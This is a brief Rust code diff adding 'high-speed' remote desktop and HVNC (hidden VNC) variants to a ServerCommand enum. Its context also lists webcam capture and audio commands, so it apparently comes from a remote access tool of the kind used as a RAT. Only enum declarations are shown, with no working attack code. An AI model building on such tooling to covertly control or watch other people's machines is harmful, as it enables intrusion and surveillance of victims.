@@ -37,6 +37,7 @@ pub enum ServerCommand {
     Log(Log),
 
     StartRemoteDesktop(SocketAddr, RemoteDesktopConfig),
+    StartHighSpeedRemoteDesktop(SocketAddr, RemoteDesktopConfig),
     StopRemoteDesktop(SocketAddr),
     StartRemoteDesktopAudio(SocketAddr),
     StopRemoteDesktopAudio(SocketAddr),
@@ -119,6 +120,7 @@ pub enum ServerCommand {
     WebcamResult(SocketAddr, Vec<u8>),
 
     StartHVNC(SocketAddr),
+    StartHighSpeedHVNC(SocketAddr),
     StopHVNC(SocketAddr),
     StartHVNCFrameAudio(SocketAddr),
     StopHVNCFrameAudio(SocketAddr),
